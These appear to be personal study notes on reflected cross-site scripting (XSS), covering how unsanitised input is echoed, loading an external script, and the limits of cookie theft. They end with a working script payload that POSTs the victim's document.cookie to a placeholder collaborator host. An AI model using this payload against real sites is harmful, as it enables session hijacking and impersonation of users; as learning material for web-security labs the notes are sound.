							DD
# What is Reflected XSS 
- we are going to spell out how to find reflected xss vulnerabilities but  lets first see  what is reflected xss ? 
-  data are taken from the user and put inside the response without sensitization 
- `alert(document.domain);` tells which domain  is in use . 
- we will learn how to execute the  xss vulnerability to prove the concept of finding it , and also its dangerousity . 
- ![[Reflected XSS-20231205094056307.webp]]
- we get to execute the <script src="link for our bad script .js that will destroy our target " ></script>
- we can use it in something like if we have the ability to use xss inside of a message parameter  and then the target is going to find him self running our bad JS script  that will run automatically in his device without him knowing until the disaster happens . 
- lets use the xss to steal the cookies of the  victim .
- we send the victims cookie to our own domain  . and then use them manually to  impersonate the victim . 
- this approach has some significant limitations:
1. the victim might not be logged in  
2. many applications hide their cookies from js using the httponly flag 
3. sessions might be locked to additional factors like the user's IP address 
4. the session might time out before you are able to hijack it . 


# to fetch cookies  we can use : 
```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```